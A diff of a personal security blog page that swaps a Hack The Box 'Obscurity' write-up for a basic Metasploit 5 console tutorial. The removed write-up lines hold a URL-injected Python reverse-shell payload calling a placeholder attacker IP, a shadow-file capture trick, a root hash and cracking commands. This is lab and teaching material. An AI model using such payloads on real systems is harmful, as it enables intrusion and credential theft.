@@ -5,35 +5,42 @@
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>Metasploit 5 | The Basics</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=906b0e7667" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//metasploit5-the-basics/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
-    <link rel="amphtml" href="https://inesmartins.github.io//htb-walkthrough-obscurity/amp/" />
+    <link rel="amphtml" href="https://inesmartins.github.io//metasploit5-the-basics/amp/" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="Metasploit 5 | The Basics" />
+    <meta property="og:description" content="Tested on Kali GNU/Linux 2020.1 1. Get the latest version of the Metasploit Framework. sudo apt-get update sudo apt-get install metasploit-framework 2. Create the database. sudo msfdb init 3. Start Metasploit&#x27;s console-based interface. msfconsole 4. Check that Metasploit is connected to the DB. msf5 &amp;gt; db_status [*] Connected" />
+    <meta property="og:url" content="https://inesmartins.github.io//metasploit5-the-basics/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1.png" />
+    <meta property="article:published_time" content="2020-06-07T17:10:38.000Z" />
+    <meta property="article:modified_time" content="2020-06-13T21:45:38.000Z" />
+    <meta property="article:tag" content="metasploit" />
+    <meta property="article:tag" content="metasploit framework" />
+    <meta property="article:tag" content="linux" />
+    <meta property="article:tag" content="tutorial" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="Metasploit 5 | The Basics" />
+    <meta name="twitter:description" content="Tested on Kali GNU/Linux 2020.1 1. Get the latest version of the Metasploit Framework. sudo apt-get update sudo apt-get install metasploit-framework 2. Create the database. sudo msfdb init 3. Start Metasploit&#x27;s console-based interface. msfconsole 4. Check that Metasploit is connected to the DB. msf5 &amp;gt; db_status [*] Connected" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//metasploit5-the-basics/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="metasploit, metasploit framework, linux, tutorial" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="483" />
+    <meta property="og:image:height" content="287" />
     
     <script type="application/ld+json">
 {
@@ -62,17 +69,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "Metasploit 5 | The Basics",
+    "url": "https://inesmartins.github.io//metasploit5-the-basics/",
+    "datePublished": "2020-06-07T17:10:38.000Z",
+    "dateModified": "2020-06-13T21:45:38.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/06/1.png",
+        "width": 483,
+        "height": 287
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "metasploit, metasploit framework, linux, tutorial",
+    "description": "Tested on Kali GNU/Linux 2020.1\n\n1. Get the latest version of the Metasploit Framework\n[https://www.metasploit.com/].\n\nsudo apt-get update\nsudo apt-get install metasploit-framework\n\n\n2. Create the database.\n\nsudo msfdb init\n\n\n3. Start Metasploit&#x27;s console-based interface.\n\nmsfconsole\n\n\n4. Check that Metasploit is connected to the DB.\n\nmsf5 &gt; db_status\n[*] Connected to msf. Connection type: postgresql.\n\n\n5. List Metasploit&#x27;s most relevant commands.\n\nmsf5 &gt; help\n\n\n6. List the available workspaces.",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -93,7 +101,7 @@
 </script>
 
 </head>
-<body class="post-template">
+<body class="post-template tag-metasploit tag-metasploit-framework tag-linux tag-tutorial">
 
     <div class="site-wrapper">
 
@@ -111,7 +119,7 @@
     <li class="nav-home"><a href="https://inesmartins.github.io//">Home</a></li>
 </ul>
 
-                    <span class="nav-post-title dash">HTB Write-up | Obscurity</span>
+                    <span class="nav-post-title dash">Metasploit 5 | The Basics</span>
             </div>
         </div>
     </div>
@@ -132,14 +140,16 @@
 <main id="site-main" class="site-main outer">
     <div class="inner">
 
-        <article class="post-full post ">
+        <article class="post-full post tag-metasploit tag-metasploit-framework tag-linux tag-tutorial ">
 
             <header class="post-full-header">
 
+                <section class="post-full-tags">
+                    <a href="/tag/metasploit/">metasploit</a>
+                </section>
 
-                <h1 class="post-full-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-full-title">Metasploit 5 | The Basics</h1>
 
-                <p class="post-full-custom-excerpt">Write-up for Obscurity, a retired HTB Linux machine.</p>
 
                 <div class="post-full-byline">
 
@@ -167,7 +177,7 @@
                             <h4 class="author-name"><a href="/author/ines/">Inês Martins</a></h4>
                             <div class="byline-meta-content">
                                 <time class="byline-meta-date" datetime="2020-06-07">7 Jun 2020</time>
-                                <span class="byline-reading-time"><span class="bull">&bull;</span> 4 min read</span>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 1 min read</span>
                             </div>
                         </section>
 
@@ -179,121 +189,76 @@
 
             <figure class="post-full-image">
                 <img
-                    srcset="/content/images/size/w300/2020/06/1-1.png 300w,
-                            /content/images/size/w600/2020/06/1-1.png 600w,
-                            /content/images/size/w1000/2020/06/1-1.png 1000w,
-                            /content/images/size/w2000/2020/06/1-1.png 2000w"
+                    srcset="/content/images/size/w300/2020/06/1.png 300w,
+                            /content/images/size/w600/2020/06/1.png 600w,
+                            /content/images/size/w1000/2020/06/1.png 1000w,
+                            /content/images/size/w2000/2020/06/1.png 2000w"
                     sizes="(max-width: 800px) 400px,
                         (max-width: 1170px) 1170px,
                             2000px"
-                    src="/content/images/size/w2000/2020/06/1-1.png"
-                    alt="HTB Write-up | Obscurity"
+                    src="/content/images/size/w2000/2020/06/1.png"
+                    alt="Metasploit 5 | The Basics"
                 />
             </figure>
 
             <section class="post-full-content">
                 <div class="post-content">
-                    <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV -A obscurity.htb
-
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<!--kg-card-end: markdown--><p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img0_1.png" class="kg-image"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img0_2.png" class="kg-image"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img0_3.png" class="kg-image"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+                    <p><em>Tested on Kali GNU/Linux 2020.1</em></p><p>1. Get the latest version of the <a href="https://www.metasploit.com/">Metasploit Framework</a>.</p><!--kg-card-begin: markdown--><pre><code>sudo apt-get update
+sudo apt-get install metasploit-framework
 </code></pre>
-<!--kg-card-end: markdown--><p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br>While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img1.png" class="kg-image"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><!--kg-card-begin: markdown--><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<!--kg-card-end: markdown--><p>2. Create the database.</p><!--kg-card-begin: markdown--><pre><code>sudo msfdb init
 </code></pre>
-<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><!--kg-card-begin: markdown--><pre><code>$ cat etc/passwd
+<!--kg-card-end: markdown--><p>3. Start Metasploit's console-based interface.</p><!--kg-card-begin: markdown--><pre><code>msfconsole
+</code></pre>
+<!--kg-card-end: markdown--><p>4. Check that Metasploit is connected to the DB.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; db_status
+[*] Connected to msf. Connection type: postgresql.
+</code></pre>
+<!--kg-card-end: markdown--><p>5. List Metasploit's most relevant commands.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; help
+</code></pre>
+<!--kg-card-end: markdown--><p>6. List the available workspaces.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace
+* default
+</code></pre>
+<!--kg-card-end: markdown--><p>7. Add a new workspace.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace -a testymcgee
+[*] Added workspace: testymcgee
+[*] Workspace: testymcgee
+</code></pre>
+<!--kg-card-end: markdown--><p>8. Select a workspace.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace default
+[*] Workspace: default
+</code></pre>
+<!--kg-card-end: markdown--><p>9. Delete a workspace.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; workspace -d testymcgee
+[*] Deleted workspace: testymcgee
+[*] Swiched to workspace: default
+</code></pre>
+<!--kg-card-end: markdown--><p>10. Search for a specific module. Alternatively, you can search directly on Metasploit's <a href="https://metasploit.help.rapid7.com/docs">web docs</a>.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; search [search term]
+</code></pre>
+<!--kg-card-end: markdown--><p>11. See more information about a module. This includes the module's name, path, description, date of disclosure, <a href="https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking">rank</a>, support for the <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-check%28%29-method">check command</a>, author, basic options and references.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; info [module_path]
+</code></pre>
+<!--kg-card-end: markdown--><p>12. Setup the module.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; set RHOST [ip]
+msf5 &gt; set RPORT [port]
 ...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
 </code></pre>
-<!--kg-card-end: markdown--><p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><!--kg-card-begin: markdown--><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
+<!--kg-card-end: markdown--><p>13. Setup global options.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; set -g RHOST [ip]
+msf5 &gt; set -g RPORT [port]
 </code></pre>
-<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
-
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
+<!--kg-card-end: markdown--><p>14. Select an exploit module.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use [exploit_path]
 </code></pre>
-<!--kg-card-end: markdown--><p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br>Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br>Let's create a script to find the key!</p><pre><code>import sys
-
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
+<!--kg-card-end: markdown--><p>15. Show options for the selected exploit.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; show options
 </code></pre>
-<!--kg-card-end: markdown--><p>Let's run <code>BetterSSH</code> as sudo to test this:</p><!--kg-card-begin: markdown--><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
+<!--kg-card-end: markdown--><p>16. List the targets supported by the exploit.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; show options
 </code></pre>
-<!--kg-card-end: markdown--><p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/script3.png" class="kg-image"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/script4.png" class="kg-image"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><!--kg-card-begin: markdown--><pre><code>$ echo &quot;root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7&quot; &gt; shadow
-$ echo &quot;root:x:0:0:root:/root:/bin/bash&quot; &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
+<!--kg-card-end: markdown--><p>17. List available payloads for these targets.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; show targets
 </code></pre>
-<!--kg-card-end: markdown--><p>That's it, hope you enjoyed it!</p>
+<!--kg-card-end: markdown--><p>18. Select a payload.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; set payload [payload_path]
+payload =&gt; [payload_path]
+</code></pre>
+<!--kg-card-end: markdown--><p>19. Run the exploit. Note that if we don't select a payload, Metasploit uses the default.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; exploit
+</code></pre>
+<!--kg-card-end: markdown--><p>20. Return to "main menu".</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; back
+msf5 &gt;
+</code></pre>
+<!--kg-card-end: markdown--><p>21. Exit the app.</p><!--kg-card-begin: markdown--><pre><code>msf5 exploit([exploit_path]) &gt; exit
+</code></pre>
+<!--kg-card-end: markdown-->
                 </div>
             </section>
 
@@ -307,59 +272,6 @@ $ john crack.password.db
 <aside class="read-next outer">
     <div class="inner">
         <div class="read-next-feed">
-
-                <article class="post-card post tag-windows tag-smb tag-smbv2 tag-kali tag-cisco tag-rockyou tag-hashcat tag-impacket tag-crackmapexec tag-evil-winrm ">
-
-    <a class="post-card-image-link" href="/htb-walkthrough-heist/">
-        <img class="post-card-image"
-            srcset="/content/images/size/w300/2020/06/heist.png 300w,
-                    /content/images/size/w600/2020/06/heist.png 600w,
-                    /content/images/size/w1000/2020/06/heist.png 1000w,
-                    /content/images/size/w2000/2020/06/heist.png 2000w"
-            sizes="(max-width: 1000px) 400px, 700px"
-            loading="lazy"
-            src="/content/images/size/w600/2020/06/heist.png"
-            alt="HTB Write-up | Heist"
-        />
-    </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="/htb-walkthrough-heist/">
-
-            <header class="post-card-header">
-                    <div class="post-card-primary-tag">windows</div>
-                <h2 class="post-card-title">HTB Write-up | Heist</h2>
-            </header>
-
-            <section class="post-card-excerpt">
-                    <p>Retired machine can be found here. After doing an initial scan with nmap, we find 3 exposed services: a web server on port 80 which seems to be a "Support</p>
-            </section>
-
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-            
-                    <div class="author-name-tooltip">
-                        Inês Martins
-                    </div>
-            
-                    <a href="/author/ines/" class="static-avatar">
-                        <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="/author/ines/">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-06-07">7 Jun 2020</time> <span class="bull">&bull;</span> 3 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
-</article>
 
                 <article class="post-card post tag-recon-ng tag-kali tag-tutorial ">
 
@@ -413,6 +325,7 @@ $ john crack.password.db
     </div>
 
 </article>
+
         </div>
     </div>
 </aside>
